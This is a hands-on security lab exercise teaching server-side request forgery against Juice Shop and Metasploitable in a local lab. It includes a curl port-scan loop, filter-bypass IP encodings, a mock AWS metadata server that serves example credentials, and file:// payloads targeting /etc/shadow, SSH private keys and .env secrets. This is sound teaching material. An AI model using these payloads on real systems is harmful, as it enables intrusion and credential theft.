# 🔬 Lab Exercise 6: SSRF (Server-Side Request Forgery)

> **Challenge:** Make the server send requests to internal/unintended destinations
> **Where:** Juice Shop on Kali + Metasploitable internal services
> **Time:** ~45-55 minutes

---

## Exercise 6A: Understand SSRF Concepts

```
SSRF Attack Flow:
1. Find a feature where the server fetches a URL you provide
   (image loaders, URL previews, webhooks, PDF generators, imports)
2. Instead of a public URL, supply an internal/private one
3. The SERVER makes the request (not your browser)
4. The server can access internal services you can't reach directly

Why SSRF is dangerous:
├── Access internal services (Redis, MySQL, admin panels)
├── Read cloud metadata (AWS/GCP/Azure secrets, IAM credentials)
├── Port scan internal networks
├── Bypass firewalls (server is on the trusted internal network)
└── Read local files (using file:// protocol)

📝 Key difference from CSRF:
  - CSRF: Attack uses the VICTIM'S browser to make requests
  - SSRF: Attack uses the SERVER itself to make requests
```

---

## Exercise 6B: SSRF via Juice Shop

**Target:** Juice Shop at `http://localhost:3000`

```
Step 1: Login to Juice Shop
  - Go to http://localhost:3000/#/login
  - Email: test@juice.com / Password: testtest1!

Step 2: Look for URL-fetching features
  - Check the profile page — is there an avatar/image URL feature?
  - Check the complaint form — can you submit a URL?
  - Check product reviews — any URL handling?
  📝 List any features that accept URLs: ______________

Step 3: Try the Juice Shop scoreboard for SSRF challenges
  - Go to http://localhost:3000/#/score-board
  - Look for "SSRF" related challenges
  📝 List related challenges: ______________

Step 4: Test basic SSRF payloads
  - In any URL input field you found, try:
    http://localhost:3000
    http://127.0.0.1:3000
    http://[::1]:3000
  📝 Does the server fetch these URLs?
  📝 What response do you get?
```

---

## Exercise 6C: SSRF to Scan Internal Ports on Metasploitable

**Task:** Simulate SSRF by demonstrating how an attacker would scan internal services.

```bash
# Scenario: You found an SSRF vulnerability on a server at 192.168.56.20
# The server can access internal ports that you can't reach from outside

# Step 1: Manual port scan simulation (from Kali to Metasploitable)
# This simulates what the vulnerable server would do internally

# Check common internal services
curl -s -o /dev/null -w "Port 22 (SSH): %{http_code}\n" http://192.168.56.20:22 --max-time 3 2>/dev/null || echo "Port 22: Connection made (service detected)"
curl -s -o /dev/null -w "Port 80 (HTTP): %{http_code}\n" http://192.168.56.20:80 --max-time 3
curl -s -o /dev/null -w "Port 8180 (Tomcat): %{http_code}\n" http://192.168.56.20:8180 --max-time 3

# Step 2: Scan multiple ports using a loop (SSRF port scan technique)
for port in 21 22 23 25 80 139 445 512 513 514 1099 1524 2049 2121 3306 3632 5432 5900 6000 6667 8009 8180; do
  response=$(curl -s -o /dev/null -w "%{http_code}" http://192.168.56.20:$port --max-time 2 2>/dev/null)
  echo "Port $port: $response"
done

# 📝 Which ports responded? ______________
# ✅ In a real SSRF, the vulnerable server scans its OWN internal network
#    revealing services hidden behind the firewall

# Step 3: Access internal service data via SSRF
# If you found port 8180 (Tomcat), try:
curl http://192.168.56.20:8180/manager/html --max-time 5
# 📝 What information is revealed?
```

---

## Exercise 6D: SSRF Filter Bypass Techniques

**Task:** Practice different IP representations that bypass SSRF filters.

```bash
# Many apps block "127.0.0.1" and "localhost" — try these alternatives:

# Standard representations
echo "=== Standard ==="
# 127.0.0.1
# localhost
# [::1] (IPv6 loopback)

# Decimal representation
echo "=== Decimal ==="
# 127.0.0.1 in decimal = 2130706433
python3 -c "import struct; print(struct.unpack('!I', bytes([127,0,0,1]))[0])"
# ✅ OUTPUT: 2130706433
# Use: http://2130706433

# Octal representation
echo "=== Octal ==="
# 127 = 0177, 0 = 0, 0 = 0, 1 = 01
# Use: http://0177.0.0.01
# Or: http://0177.0000.0000.0001

# Hex representation
echo "=== Hex ==="
# 127.0.0.1 in hex = 0x7f000001
# Use: http://0x7f000001
# Or: http://0x7f.0x0.0x0.0x1

# DNS rebinding (if server does DNS resolution)
echo "=== DNS tricks ==="
# http://localtest.me → resolves to 127.0.0.1
# http://127.0.0.1.nip.io → resolves to 127.0.0.1
# http://spoofed.burpcollaborator.net → attacker-controlled DNS

# URL tricks
echo "=== URL tricks ==="
# http://google.com@127.0.0.1 → browser auth trick
# http://127.0.0.1#@google.com → fragment trick
# http://127.1 → shorthand for 127.0.0.1

# Step: Test each bypass against curl
curl http://2130706433 --max-time 3 2>/dev/null && echo "Decimal works!" || echo "Decimal blocked"
curl http://0x7f000001 --max-time 3 2>/dev/null && echo "Hex works!" || echo "Hex blocked"
curl http://0177.0.0.01 --max-time 3 2>/dev/null && echo "Octal works!" || echo "Octal blocked"
curl http://127.1 --max-time 3 2>/dev/null && echo "Shorthand works!" || echo "Shorthand blocked"

# 📝 Which bypass representations resolved to 127.0.0.1?
```

---

## Exercise 6E: Simulate Cloud Metadata Access

**Task:** Understand how SSRF leads to cloud credential theft.

```bash
# Step 1: Set up a mock metadata endpoint on Kali
# Create a simple Python server that simulates AWS metadata

cat > /tmp/mock_metadata.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class MetadataHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        responses = {
            '/latest/meta-data/': 'ami-id\nami-launch-index\nhostname\niam/',
            '/latest/meta-data/iam/': 'info\nsecurity-credentials/',
            '/latest/meta-data/iam/security-credentials/': 'admin-role',
            '/latest/meta-data/iam/security-credentials/admin-role': json.dumps({
                "Code": "Success",
                "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
                "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "Token": "FwoGZXIvYXdzEBYaDHqa0AP1...[MOCK]",
                "Expiration": "2026-03-21T00:00:00Z"
            }, indent=2),
            '/latest/meta-data/hostname': 'ip-10-0-1-100.internal',
        }
        response = responses.get(self.path, '404 Not Found')
        self.send_response(200 if self.path in responses else 404)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(response.encode())
    def log_message(self, format, *args):
        print(f"[METADATA REQUEST] {args[0]}")

print("Mock AWS Metadata running on :8169")
print("Simulates http://169.254.169.254")
HTTPServer(('0.0.0.0', 8169), MetadataHandler).serve_forever()
PYEOF

# Step 2: Run the mock metadata server
python3 /tmp/mock_metadata.py &

# Step 3: Simulate SSRF access to metadata endpoint
# In a real SSRF, the URL would be: http://169.254.169.254/latest/meta-data/
# We simulate with our mock server on port 8169:

curl http://localhost:8169/latest/meta-data/
# ✅ EXPECTED: ami-id, ami-launch-index, hostname, iam/

curl http://localhost:8169/latest/meta-data/iam/security-credentials/admin-role
# ✅ EXPECTED: AWS credentials (AccessKeyId, SecretAccessKey, Token)!
# 📝 In a real attack, these credentials give FULL access to the AWS account

# 📝 This is why SSRF on cloud-hosted servers is critically dangerous:
#    One SSRF vulnerability → Full cloud account compromise

# Step 4: Stop the mock server
kill %1
```

---

## Exercise 6F: SSRF via File Protocol

```bash
# In a real SSRF, you can also use file:// protocol to read local files

# Simulate this locally:
curl file:///etc/passwd
# ✅ EXPECTED: Contents of /etc/passwd displayed

curl file:///etc/hostname
# ✅ EXPECTED: System hostname

# In a real SSRF, these payloads would be:
# http://vulnerable-app.com/fetch?url=file:///etc/passwd
# http://vulnerable-app.com/fetch?url=file:///proc/self/environ  (env variables)
# http://vulnerable-app.com/fetch?url=file:///root/.ssh/id_rsa  (SSH keys)

# 📝 Common files to target via SSRF with file:// protocol:
# /etc/passwd          → User accounts
# /etc/shadow          → Password hashes (if readable)
# /proc/self/environ   → Environment variables (may contain secrets)
# /root/.ssh/id_rsa    → SSH private key
# /var/www/html/.env   → Application secrets
# /etc/nginx/nginx.conf → Web server config
```

---

## ✅ Completion Checklist

- [ ] Understood SSRF concepts and attack flow (6A)
- [ ] Explored Juice Shop for SSRF-related features and challenges (6B)
- [ ] Simulated SSRF port scanning against Metasploitable (6C)
- [ ] Practiced SSRF filter bypass with decimal/hex/octal IP encodings (6D)
- [ ] Simulated cloud metadata access with mock AWS endpoint (6E)
- [ ] Tested file:// protocol for local file reading via SSRF (6F)

---

**Next:** [Challenge 25: XXE Injection →](./07_lab_xxe_injection.md)
